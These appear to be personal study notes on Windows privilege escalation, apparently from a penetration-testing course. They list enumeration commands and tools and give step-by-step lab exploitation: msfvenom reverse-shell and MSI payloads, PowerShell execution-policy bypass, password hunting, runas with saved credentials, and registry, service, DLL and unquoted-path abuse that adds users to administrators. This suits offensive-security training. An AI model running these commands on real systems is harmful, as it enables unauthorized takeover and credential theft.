Different Account types:
	
	1. Domain Administrators: This is typically the highest account level you will find in an enterprise along with Enterprise Administrators. An account with this level of privilege can manage all accounts of the organization, their access levels, and almost anything you can think of. A "domain" is a central registry used to manage all users and computers within the organization.
	
	2. Services: Accounts used by software to perform their tasks such as back-ups or antivirus scans.
	
	3. Domain Users:  Accounts typically used by employees. These should have just enough privileges to do their daily jobs. For example, a system administrator may restrict a user's ability to install and uninstall software.
	
	4. Local Accounts: These accounts are only valid on the local system and can not be used over the domain.

	Accounts can be easily managed with groups. For example, the McSkidy account can be created as a regular user and be later added to the Domain Administrators group, giving it Domain Administrator privileges.


Initial Information Gathering:
	1. net user: this command will list users on the target system.
	2. systeminfo | findstr /B /C: "OS Name"/C: "OS Version": It will output info about the OS. 
	3. wmic service list: list services installed on the target system. 



TCM Windows Priv Esc
	Resources: 
		1. https://www.fuzzysecurity.com/tutorials/16.html
		2. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
		3. https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
		4. https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
		5. https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources


	Initial Enumeration
		
		System Enumeration
			>systeminfo
			>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
				-> like grep.
			>hostname
			>wmic qfe 
				-> wmic - windows management instrumentation commandline
				-> qfe - quick fix engineering
				-> We are basically querying what's available, what's patched, when was it last patched.

			>wmic qfe get Caption,Description,HotFixID,InstalledOn
				-> filter based on fields
			>wmic logicaldisk - lists all the drives
			>wmic logicaldisk get caption,description -> filter based on fields

			Note: WMIC has been deprecated in latest versions of windows 10, it comes with powershell now, you can use this link to read about it more: https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/07-working-with-wmi?view=powershell-7.1

		User Enumeration
			>whoami - current user
			>whoami /priv - privileges of current user
			>whoami /groups - lists groups of current user.

			>net user - list all the users.
			>net user [username] - more information about a user.

			>net localgroup - lists groups
			>net localgroup [groupname] - lists users which are part of this group

			>qwinsta/query session - other users logged in simultaneously.

		Network Enumeration
			>ipconfig
			>ipconfig /all
			>arp -a
			>route print
			>netstat -ano


		Password Hunting
			>findstr /si password *.txt - look for string "password" in current and subdirectory in all the files with .txt extension
				/si means it will ignore lowercase and uppercase
			>findstr /si password *.txt *.ini *.config

			-> Most of the work will be done by automated tools

		Scheduled tasks:
			>schtasks
			>schtasks /query /fo LIST /v

		Drivers:
			>driverquery - list drivers installed on the target system.

		Firewall and A/V Enumeration
			>sc query windefend 
				-> sc stands for service control and here we are querying for windows defender. 
				Sample Output:
				SERVICE_NAME: windefend 
				        TYPE               : 20  WIN32_SHARE_PROCESS  
				        STATE              : 4  RUNNING 
				                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
				        WIN32_EXIT_CODE    : 0  (0x0)
				        SERVICE_EXIT_CODE  : 0  (0x0)
				        CHECKPOINT         : 0x0
				        WAIT_HINT          : 0x0

			>sc queryex type=service - lists all the services 

			commands related specifically to firewall:
				>netsh advfirewall firewall dump - relatively new command
				>netsh firewall show state - old command
				>netsh firewall show config - configuration


	Automated Tools
		Executables: 
			1. winPEAS.exe
			2. Seatbelt.exe (compile) 
			3. Watson.exe (compile)
			4. SharUp.exe (compile)

		PowerShell
			1. Sherlock.ps1
			2. PowerUp.ps1
			3. jaws-enum.ps1

		Other
			1. windows-exploit-suggester.py (local)
			2. Exploit Suggester (Metasploit)
				>run post/multi/recon/local_exploit_suggester

		Notes about these tools:	
			1. Sherlock.ps1 just looks for common CVEs
			2. Watson.exe is an updated version of sherlock.ps1 (now deprecated). To make this script run, you will have to find out the .net version of the target and compile the script before running.
			3. PowerUp.ps1 - great great tool
			4. SharUp.ps1 - almost same as PowerUp.ps1

		>powershell -ep bypass - If this command hangs, then on meterpreter, there's a feature called load powershell
		>powershell.exe -nop -exec bypass
		>Import-Module .\PowerUp.ps1
		>Invoke-AllChecks

	Kernel Exploits:
		-> Kernel is a computer program which facilitates interactions between hardware and the software components. Its the core of the OS.
		Github repo of all windows kernel exploits: https://github.com/SecWiki/windows-kernel-exploits
		-> If we own the kernel, we own the system.

	Vulnerable Software
		>wmic product - dump information it can gather on installed software.
		>wmic product get name,version,vendor

		Note: Due to backward compatibility issues, (software written for 32 bits systems running on 64 bits), wmic product may not return all installed programs. Therefore, it is worth checking running services too.

		>wmic service list
		>wmic service list brief
		>wmic service list brief | findstr "Running"
		>sc qc [service name] - for more information about a service.
		

	Windows Subsystem for Linux
		Link: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#windows-subsystem-for-linux-wsl
		>wsl whoami

	Token Impersonation and Potato Attacks
		What are tokens?
			-> Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers
		Two Types:
			1. Delegate - Creating for logging into a machine or using Remote Desktop
			2. Impersonate - "non-interactive" such as attaching a network drive or a domain logon script.

		Note: Tokens go away when the computer is rebooted. 
		Meterpreter related commands:
			>load incognito
			>list_tokens -u
			>impersonate_token marvel\\fcastle
			>getprivs - list privileges of the user

			Note: sometimes, after impersonating the system token, you are not able to drop into a shell, what you can do is, list processes using ps and migrate to a System process. Then you will be able to drop into a system shell.
			Migration to svchost.exe is one of the reliable pathways.
		Shell commands:
			>whoami /priv
				Look for special ones if enabled:
					1. SeImpersonatePrivilege (Impersonate a client after authentication)
						- Similar to SeAssignPrimaryToken
						- Exploits: potato, rottenpotato, and juicypotato
					2. SeChangeNotifyPrivilege (Bypass Traverse checking)
		
		Potato Attacks:
			Links:
				1. https://github.com/ohpe/juicy-potato
				2. https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
				3. use windows/local/ms16_075_reflection

		Alternate Data Streams:
			https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/

	getSystem (One of the tools of Metasploit)
		>getsystem -h
		Link: https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem/
		Technique 2 can be detected by the Antivirus (it runs on disk)
		Technique 3 finds all the services which are running as SYSTEM and the ones which we can inject into. (in memory, require SeDebugPrivilege)
		-> You need to be careful when running this because it could crash the system.

	RunAs
		-> allows us to run a command as somebody else.
		>cmdkey /list
			-> finds stored credentials
			-> priv esc tools like winpeas will identify this.
		>C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"

	Registry
		Autorun
			Overview:
				-> We will check for if anything runs automatically and we will check whether we have permissions to change the permissions so that we can elevate.
				-> Open Autorun, click on Logon tab, and look for interesting programs and their path. When you find it, we will be using the program accesschk64.exe to view the write permissions of the directory. 
				>C:\Users\user\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
					-> -w: check for write permissions
					-> -v: verbosity
					-> -u: surpress errors
				-> If the permissions comes out to be "RW Everyone: FILE_ALL_ACCESS", then we can get really malicious, make somebody else run as administrator and then we can get admin access.
				-> If you run PowerUp.ps1, it will show up under the section of "modifiable registry autoruns and configs".
			Exploitation:
				-> Open msfconsole and also generate windows payload using msfvenom
				-> Next, replace the file with your executable and now when the administrator logs in, you will get a shell.

		AlwaysInstallElevated
			Overview:
				-> There are packages for windows which are MSI packages and these are windows installer.
				-> We have this registry feature where we can have these packages automatically install elevated, so they will install as admin user. 
				>reg query HKLM\Software\Policies\Microsoft\Windows\Installer
					-> If the output shows up like this: 
						AlwaysInstallElevated REG_DWORD 0x1
					-> It means this feature is on.
				>reg query HKCU\Software\Policies\Microsoft\Windows\Installer
					-> If this query also returns 1 then we are good to go.
			Exploitation:
				Methods:
					1. PoweUP.ps1
						-> In the section Checking for AlwaysInstallElevated registry key, if its enabled you will see a function is given:
							AbuseFunction : Write-UserAddMSI
						-> Run this given function and it will create a installer package for you.
						-> The msi package will be present in the same directory as the powerup script.
						-> Double click the package, it will open a popup, and it will ask you the new username and password, select create and it will add the new user to administrators group.
						-> You can check by running the command net localgroup administrators

					2. msfconsole
						-> set up multi/handler and generate the shell using msfvenom.
						>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=5555 -f msi > setup.msi
						-> Put the msi package in temp directory. Then type:
							>msiexec /quiet /qn /i C:\Temp\setup.msi 
					3. use exploit/windows/local/always_install_elevated
						-> set the session and run
		Service Escalation
			Overview:
				-> In the powershell prompt and type:
					>Get-Acl -Path hklm:\System\CurrentControlSet\Services\regsvc | fl
				-> If the output shows:
					NT Authority\Interactive Allow FullControl
				-> which means we can easily abuse this and get system access.
				-> What we can do is, add a malicious executable to a service, start the service, and that service will come back and add a user to administrators group.
			Exploitation:
				-> In the transfers folder in your local machine, open windows_service.c in text editor and replace the command used by system() to cmd.exe /k net localgroup administrators [local user on the victim machine] /add
				-> Now we have to compile the c file:
					>x86_64-w64-mingw32-gcc windows_service.c -o x.exe
				-> Now, copy the generated executabe to the victim's temp folder.
				-> Now, in the victim's cmd shell, run:
					reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
				-> What this command is doing is: we are adding to a registry.
					/v means for what subkey we are adding to this registry.
					ImagePath is the registry key which contains the path to the driver's image file.
					-> So if we place an executable's path in this key's value, and we tell the service to start, it will execute the file for us.
					/t means type
					REG_EXPAND_SZ is just a string value
					/d means data and /f means don't prompt me for this.
				-> Next, run the command "sc start regsvc"
				-> You will see that the local user has been added to the admin group.

	Executable Files:
		Overview:
			-> Occasionaly we will see services running which has executables attached to them. 
			-> And if that executable has "FILE_ALL_ACCESS" permission set for Everyone then guess what.
			-> We can create an executable, write to the folder where the service calls the executable, start the service and escalate.
			-> If you have access to the binary accesschk64.exe then run:
				accesschk64.exe -wvu [Location to service folder]
			-> And we have RW Everyone permission then we are good to go.
			-> Better way to check is run PowerUp.ps1 and look for "Checking service executable and argument permissions"
			-> In the output we can see it gives Service name, Path, modifiable file, and permissions and also whether we can restart. Also the value to "ModifiableFileIdentityReference" will be set to Everyone.
		Exploitation:
			-> Generate an executable from a service.c file as shown in previous step.
			-> Transfer to the victim machine where we have access to modify the exectuable.
			-> now start the service again:
				>sc start [service name]
			-> If you have used the executable from the previous task, then the local user should have added to the administrators group.

	Startup Applications:
		Overview:
			-> similar concept to autoruns
			-> When the machine boots up, an application starts up. We can replace the startup application if permissions grants us, with a malicious file and when the machine starts, that malicious file will get executed and give us a shell. 
			-> We can utilize icacls.exe to see the permissions and allows us to see where we might have access.
			-> Sometimes, the priv esc scripts might not highlight this, so you will have to run it manually to find out whether we have permissions.

			>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
				-> If the output shows:
					BUILTIN\Users:(F) that means we have full control.
			Resource: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
		Exploitation:
			-> Start msfconsole, set the payload and run the multi handler.
			-> Next, generate the payload using msfvenom, place in startup directory and wait for the administrator user to login.

	DLL Hijacking:
		Overview:
			-> DLL or Dynamic Link libraries are just like executables but not entirely executables. They are actually shared libraries just like .so (shared objects) in linux
			-> DLLs contains classes, functions, resources, variables and often run with executables.
			-> When windows env starts up a service, or an application, it looks for dlls.
			-> If an application cannot find a dll, we can get malicious. So, we are looking for a path that is writable, and where the application is looking for a dll does not exist. 
		Exploitation
			-> In the transfers folder of your machine, there will be a file windows_dll.c. In that c code, replace the code with what you want. For example you can add the local user to the administrators group.
			-> Now you have to compile the c file with the following command:
				// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
				// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
			-> Now transfer the dll to the location where the service or executable demands it.
			-> Restart the service.
				>sc stop [service]
				>sc start [service]

	Service Permissions:
		Binary Paths:
			Detection:
				>accesschk64.exe -uwcv Everyone *
					-u: no errors
					-w:	objects with write access
					-c:	service names
					-v: verbose
				-> If the output comes out to be "RW [service name]", then we are in for a treat.
				-> If you run PowerUp.ps1, under the section of "Checking service permissions", it will show up if any service is writable, also it will give function name which we can use to get elevated.
				-> After you have found the exploitable service with accesschk, then you can run:
				>accesschk64.exe -wuvc [service name]
					-> This will pull out everything related to the service.
					-> We will be abusing the change config setting.
					-> Look out for SERVICE_CHANGE_CONFIG
				>sc qc [service name]
					-> query out the service.
					-> There should be a binary path associated with the service name which contains the value, the path to the executable of the service.
			Exploitation:
				>sc config [service name] binpath= "net localgroup administrators [username] /add"


		Unquoted Service Paths:
			Detection and Exploitation:
				-> If a service executable's path is not enclosed in quotation marks, and contains a space, then we have a quick win.
				-> Under PowerUp.ps1 output, look for unquoted service paths.
				-> In regedit, select HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSystem\services\[service with unquoted service path]
				-> So what happens is, lets say for example the ImagePath's value in registry key of service is: C:\Program Files\Unquoted Service Path\Common Files\unquotedpathservice.exe, windows when starts this service, it will look each of the paths in order.
				-> First C:\Program.exe, then, C:\Program Files.exe, C:\Program Files\Unquoted.exe and so on.
				-> If we place a file say Common.exe in "Unquoted Service Path" directly, windows will execute our file first and we could get a shell.
				-> You can also generate a payload like this:
					 msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe

	CVE-2019-1388
		Overview:
			-> We can use this vulnerability to escalate via windows certificate dialog because it was not properly enforcing the user privileges. 
		Resources:
			https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-1388/
			https://www.youtube.com/watch?v=3BQKpPNlTSo

	